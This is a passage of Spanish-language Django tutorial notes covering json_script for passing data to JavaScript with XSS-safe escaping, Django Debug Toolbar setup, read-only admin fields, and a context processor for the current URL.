           data-options-url="{% url 'options' %}"
           data-preferences-url="{% url 'preferences' %}"
           data-setup-url="{% url 'setup' %}"
           ></script>

Pero esto puede ser complicado si tenemos muchos datos, o muy
complicados. Eso nos lleva a la segunda solución.

Usar ``json_script`` para valores complejos
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Podemos pasar valores más complicados (como listas, diccionarios y, en
general, cualquier cosa que se pueda representar en JSON) con el *tag*
de django ``json_script``.

Supongamos que tenemos que pasar el valor:

.. code:: python

   saludos = {'hello': 'world'}

Para dejar estos datos accesibles desde *javascript* los pasaríamos a
través del filtro ``json_script``. La vista, obviamente, necesita los
datos en el contexto:

.. code:: python

   def vista_que_necesita_los_datos(request):
       saludos = {'hello': 'world'}
       return render(request, 'plantilla.html', {
         'saludos': saludos,
         })

Y en la plantilla, en este ejemplo ``plantilla.html``, haríamos:

.. code:: html

    {% load static %}
    ...
    {{ saludos|json_script:"saludos" }}

Esto provoca que la salida de la plantilla sea:

.. code:: html

    <script id="saludos" type="application/json">{"hello": "world"}</script>

El *script* puede ahora *parsear* y obtener esos datos en *javascript*
usando ``JSON.parse()``:

.. code:: javascript

    ...
    const saludos = JSON.parse(document.getElementById('saludos').textContent);
    console.log('saludos:', saludos);

Por seguridad ante `ataques de tipo XSS (Cross-site
scripting) <https://es.wikipedia.org/wiki/Cross-site_scripting>`__, los
caracteres ``<``, ``>`` y ``&`` se escaparán. Por ejemplo, si los datos
fueran:

.. code:: python

   saludos = {'hello': 'world</script>&amp;'}

La salida sería:

.. code:: html

   <script id="saludos" type="application/json">{"hello": "world\\u003C/script\\u003E\\u0026amp;"}</script>

Cómo configurar *Django Debug Toolbar*
--------------------------------------

Después de instalar el paquete con ``pip install django-debug-toolbar``,
hay que realizar los siguientes cambios:

-  Añadir la entrada ``debug_toolbar`` a la variable ``INSTALLED_APPS``,
   en el fichero ``settings.py``.

-  Añadir ``debug_toolbar.middleware.DebugToolbarMiddleware`` a la
   variable ``MIDDLEWARE`` en el fichero ``settings.py``.

-  Añadir ``127.0.0.1`` a la lista ``INTERNAL_IPS`` en el fichero
   ``settings.py``. Es posible que esta variable no haya sido creada. La
   barra de *debug* solo se mostrará en los servidores listados aquí.

-  Añadir una línea en el fichero ``urls.py`` para las rutas del
   paquete:

   .. code:: py

      urlpatterns = [
          ...
          path('__debug__/', include(debug_toolbar.urls)),
          ...
          ]

Cómo hacer que un campo sea de solo lectura en el admin de Django
-----------------------------------------------------------------

Primero hay que definir el campo con el atributo ``editable=False`` y
luego, en el fichero ``admin.py`` definir el campo como de solo lectura,
usando la variable ``readonly_fields``.

Ejemplo:

.. code:: python

   class PersonData(BaseModel):
       person = models.ForeignKey(Person, editable=False)
       data = models.TextField()

Y en el ``admin.py``:

.. code:: python

   class PersonDataAdmin(admin.ModelAdmin):
       readonly_fields=('person',)

Cómo obtener la URL de la página actual, con parámetros, en la plantilla
------------------------------------------------------------------------

Una forma sencilla en con un *Custom Context Processor*:

.. code:: python

    def get_current_path(request):
        return {
        'current_path': request.get_full_path()
        }

Añadimos la llamada a esta función en la lista ``TEMPLATE_CONTEXT_PROCESSORS``
del ficheor ``settings``, y luego podemos acceder desde la platilla:

.. code: django_template

    {{ current_path }}

Fuente: Stackoverflow `How to get URL of current page, including parameters ... <https://stackoverflow.com/questions/3248682/how-to-get-url-of-current-page-including-parameters-in-a-template>_`
